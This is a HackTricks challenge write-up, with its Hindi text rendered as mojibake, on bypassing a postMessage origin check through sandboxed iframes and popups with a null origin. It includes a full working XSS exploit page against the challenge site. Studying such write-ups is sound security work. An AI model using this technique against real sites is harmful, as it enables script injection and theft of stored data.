# Iframes рдореЗрдВ SOP рдХреЛ рдЫрд▓рдХрд░рддрд╛ - 1

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рдЪрд╛рд╣рд┐рдП? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>

## SOP-1 рдореЗрдВ Iframes

рдЗрд╕ [**рдЪреБрдиреМрддреА**](https://github.com/terjanq/same-origin-xss) рдХреЛ [**NDevTK**](https://github.com/NDevTK) рдФрд░ [**Terjanq**](https://github.com/terjanq) рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдореЗрдВ рдЖрдкрдХреЛ рдХреЛрдб рдореЗрдВ XSS рдХрд╛ рд╢реЛрдз рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
рдореБрдЦреНрдп рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ [**рдореБрдЦреНрдп рдкреГрд╖реНрда**](https://so-xss.terjanq.me) DomPurify рдХрд╛ рдЙрдкрдпреЛрдЧ `data.body` рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЙрд╕ рдХреЛрдб рдХреЛ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ html рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ `e.origin !== window.origin` рдХреЛ **рдмрд╛рдпрдкрд╛рд╕** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдЪрд▓реЛ, рдЙрдиреНрд╣реЛрдВрдиреЗ рдЬреЛ рд╕рдорд╛рдзрд╛рди рд╕реБрдЭрд╛рдпрд╛ рд╣реИ, рдЙрд╕реЗ рджреЗрдЦрддреЗ рд╣реИрдВред

### SOP рдмрд╛рдпрдкрд╛рд╕ 1 (e.origin === null)

рдЬрдм `//example.org` рдХреЛ **sandboxed iframe** рдореЗрдВ рд╕рдорд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкреГрд╖реНрда рдХрд╛ **рдореВрд▓** **рдЙрддреНрдкрддреНрддрд┐** **`null`** рд╣реЛрдЧрд╛, рдЕрд░реНрдерд╛рдд **`window.origin === null`** рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ iframe рд╕рдорд╛рд╣рд┐рдд рдХрд░рдХреЗ рд╣рдо **`null` рдЙрддреНрдкрддреНрддрд┐** рдХреЛ **рдмрд▓рдкреВрд░реНрд╡рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЕрдЧрд░ рдкреГрд╖реНрда **embeddable** рд╣реЛрддрд╛ рддреЛ рдЖрдк рдЙрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЙрд╕ рддрд░реАрдХреЗ рд╕реЗ **рдмрд╛рдпрдкрд╛рд╕** рдХрд░ рд╕рдХрддреЗ рдереЗ (рдХреБрдХреАрдЬ рднреА `SameSite=None` рдкрд░ рд╕реЗрдЯ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП)ред

### SOP рдмрд╛рдпрдкрд╛рд╕ 2 (window.origin === null)

рдХрдо рдЬрд╛рдирд╛ рдЬрд╛рдирдХрд╛рд░реА рд╣реИ рдХрд┐ рдЬрдм **sandbox рдорд╛рди `allow-popups` рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ **рдЦреБрд▓рд╛ popup** рд╕рднреА **sandboxed рдЧреБрдг** рдХреЛ **рд╡рд╛рд░рд┐рд╕реНрдд** рдХрд░реЗрдЧрд╛ рдЬрдм рддрдХ `allow-popups-to-escape-sandbox` рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИред\
рдЗрд╕рд▓рд┐рдП, **null рдЙрддреНрдкрддреНрддрд┐** рд╕реЗ **popup** рдЦреЛрд▓рдирд╛ **`window.origin`** рдХреЛ рдкреЙрдкрдЕрдк рдХреЗ рдЕрдВрджрд░ рднреА **`null`** рдмрдирд╛ рджреЗрдЧрд╛ред

### рдЪреБрдиреМрддреА рд╕рдорд╛рдзрд╛рди

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЪреБрдиреМрддреА рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рднреА **iframe** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, **рдкреЙрдкрдЕрдк рдЦреЛрд▓** рд╕рдХрддрд╛ рд╣реИ рд╡рд╣ рдкреГрд╖реНрда рдЬрд┐рд╕рдореЗрдВ рд╡рдВрд▓рд░реЗрдмрд▓ XSS рдХреЛрдб рд╣реИрдВрдбрд▓рд░ (`/iframe.php`) рдХреЗ рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ `window.origin === e.origin` рдХреНрдпреЛрдВрдХрд┐ рджреЛрдиреЛрдВ `null` рд╣реИрдВ, рдЗрд╕рд╕реЗ **XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ payload рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред

рд╡рд╣ **payload** **рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдПрдХ **XSS** рдХреЛ **рд╡рд╛рдкрд╕ рд╢реАрд░реНрд╖ рдкреГрд╖реНрда** (рдкреЙрдкрдЕрдк рдЦреЛрд▓рдиреЗ рд╡рд╛рд▓рд╛ рдкреГрд╖реНрда) рдкрд░ рднреЗрдЬреЗрдЧрд╛, **рдЬрд┐рд╕реЗ** **рд╕реНрдерд╛рди** рдХреЛ **рд╡рд┐рдХрд▓реНрдк** рдХрд░реЗрдЧрд╛ **рд╡рдВрд▓рд░реЗрдмрд▓** `/iframe.php` рдкрд░ред рдХреНрдпреЛрдВрдХрд┐ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдорд╛рдпрдиреЗ рдирд╣реАрдВ рд░рдЦрддрд╛ рдХрд┐ рд╢рд░реНрдд `window.origin === e.origin` рдкреВрд░реА рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ (рдзреНрдпрд╛рди рджреЗрдВ, рдореВрд▓ рд╣реИ **popup** рдЬреЛ iframe рд╕реЗ **рдЙрддреНрдкрддреНрддрд┐** **`null`** рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ `data.identifier === identifier`ред рдлрд┐рд░, **XSS рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛**, рдЗрд╕ рдмрд╛рд░ рд╕рд╣реА рдЙрддреНрдкрддреНрддрд┐ рдореЗрдВред
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдкрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
